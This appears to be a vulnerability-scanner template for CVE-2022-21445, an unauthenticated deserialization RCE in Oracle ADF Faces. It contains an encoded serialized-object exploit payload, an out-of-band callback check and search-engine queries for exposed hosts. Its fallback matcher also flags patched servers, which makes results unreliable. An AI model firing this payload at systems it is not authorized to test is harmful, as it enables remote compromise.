id: CVE-2022-21445

info:
  name: Oracle Fusion Middleware ADF Faces - Remote Code Execution
  author: ru-aish
  severity: critical
  description: |
    Oracle Fusion Middleware ADF Faces versions 12.2.1.3.0 and 12.2.1.4.0 contain an unauthenticated deserialization vulnerability allowing remote code execution via malicious serialized Java objects in the RemoteApplicationResourceLoader component. Also known as "Miracle Exploit".
  impact: |
    Successful exploitation allows complete system compromise with unauthenticated remote code execution, potentially leading to data theft, malware deployment, and lateral movement within the network.
  remediation: |
    Apply Oracle Critical Patch Update (CPU) April 2022 or later. Restrict network access to affected endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-21445
    - https://github.com/hienkiet/CVE-2022-21445-for-12.2.1.3.0-Weblogic
    - https://blog.ostorlab.co/oracle_application_development_framework.html
    - https://www.oracle.com/security-alerts/cpuapr2022.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-21445
    cwe-id: CWE-502
    epss-score: 0.96847
    epss-percentile: 0.9917
    cpe: cpe:2.3:a:oracle:application_development_framework:12.2.1.3.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: oracle
    product: application_development_framework
    shodan-query: 'http.component:"Oracle Application Development Framework"'
    fofa-query: app="Oracle-ADF-Faces"
  tags: cve,cve2022,oracle,rce,deserialization,adf-faces,kev,oob


http:
  - raw:
      - |
        GET /em/afr/foo/remote/{{payload}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

    payloads:
      payload:
        - "H4sIAAAAAAAA_w%3D%3DnVZNbBtVEP7Wsb2Ou0lbp23qlkJb%2BuM0jX8SO2niAvVPTAtO2sYhbZJCul6_-2NvYu87uc344cEDcuHDg0nLg2EslVA6mQmrFCSRQ4YAECAnEGcGJAxwQZdZ22jhxlYB_dj3zZr6Z-b2beW9_5HQ7TwICil_xc1vK6qRf9qsaZoclFf4WrlrSkLzD_BCvpnCV0zeRGReG68fDWb6nZn39d-tsE2C1dpTtZjRt7k6JpN35CX5ECR4AIXszeYwqNpSKW5HJtXNZWrusYxkKaIgbWIgbWIAStioB4x-kCjKppl87BRdKVeMNXS_he5voL_39dUPd5k9RRuwUga9iFFoa0Yb8I9_9eDdP_HjrRqfduKTrRlw-EuNp2Etzao4jtN28L%2BSYxlW%2BWs%2BaIO780f2X0zX5SyNJ180v__n0AeUaxpsibAJ2bSyaG3Y4RDgl-iHAJtRZtETiWpd7ICq%2B1Ss4WmQDnWYvdiwL2%2BVq0pWfKDTd2iJAkdKCzKYnJgsHknIAOpWIYxGVN-3uPrSW%2B0irpBvhJ2wyPAlWe8VgIBXU22NWXUhT0COi2bOu4V3VgQsU_Azg2WbuzFfgleHBDQTvZj-jBd0SuCcbx1mhhuqlo_ObgqzPrDB5otEN1BHoGSfwSERz0p4DocF7H%2BaIVWvXlgBw77NxWtVz80q-F44K2K3omkYSTdl5WcsVmWGROybhOE5Q4YhckilF2WC5lMqKFLivBcdWjGrmRMiHHhGnJPTitIDu-p9hRL03GY4rCTFOtTYfdN2ONgA9%2BCQEEBbRRKgJOtGDbklo_USOPDDOWiozGbrHCTO5CuN6w8zQZ-zBAx2DRXdTYunKFoSinnRgQjEqI4K0BUzdFSma_Siq9nxgUaW1E3_ZpcYm6cQ0xEXEICyWa8VZOz-koAdFPGSoZeZYQGc2KKADZUVPSXhZZwnAK6n9WVmJGSTbRzzhrkLr1Buy6pm%2BaUljGGc5p2ay2VV-o3k_uD5qoiAbGaskmsKiPTNuXMJlERMSMpikuj0xnKjQSVGimG6i8FjY25RAQ00ZTAmwBRQL7aqE-acxQF9kKUwT4mnZ4C85UHav1hHGNMMyCC2_QvY%2BwrkMWkZWgINeUWcOD2rAsqzylG7XOXBAxT3v7-idnoisLK1nCLKAi4uvVBVZRL2ZwcSNduayflsXD_QDzYnwhGgsHQULw_nIyHgslUaigyHItFBuOp-WnCib0_oOSrQzrSqsfFKKcuMyfph50nrilyckg3VkhvKrhYVsEw3nWHEUs7JZUq3ebkx7QIc8_Vd-5H3qRqQMDbbY7N5oBKXNCyqVcmYbT5D_Vx%2BK0ZHhsrIwJpcb5N0ZvWIoLKVaQvg_4vktEjiCPD2I-rJdAbxEqXW%2BQ8A2ccJH2h1Nt9yF8grZ7aE_3VrHT00WKvVV091oLVRwcO21pj1Tx_HifvYqTfST3-jdi9dksdahh77Q3rEYfXYS0M2Glhus0TyVirDpIEkoZIOvgZIiNOr_NzzHidVQzfwoTnhXt4qYpR-z4UqXr2JI_dw0XkfkZrDtN3zWmba4XWS65UR8TaefbI6a62%2Bvm7VK1Yxd%2BU27Om7xNOFb_EdGNqw-QEzj2EXXTtLuhgQPjtIZfhr7EEI3zuAALuMQlumZ8g7V7H1a_RjH8BAnCaOXUHrwPVkXCeEa2vER-YU6jRPV8SHWs_5LwBT2FNYp7FHehowwbedzGIgyyPoMPSF%2BmXlzG2zDpl4OiXSM9JwTqAypYovsy-fQfgeEThRRF5EW4Rgghf7UqfCPA3Doi4_ogASM4TMZE4UtgVcrVhlf49Bbb572ltlryFha6uiz%2B5-bWhLY0dpzozTITpO5zZvtRfScJPJJZpUOc8W8RY66popZph0itQ0K2WOzuaB5fBtd%2BtwHB4N9Y8m-YuHhVHAwGQwHQ7HhZDg4GO9PJhJD4cGB2L%2BR9c_O%2BgoAAA%3D%3D-"

    matchers-condition: or
    matchers:
      # Primary: OOB callback (works on unpatched versions)
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

      # Fallback: Vulnerability indicators (works on patched versions too)
      - type: dsl
        dsl:
          - 'status_code == 500'
          - 'contains(header, "X-Oracle-Dms-Ecid")'
        condition: and

    extractors:
      - type: regex
        part: header
        group: 1
        regex:
          - 'X-Oracle-Dms-Ecid: ([a-f0-9-]+)'
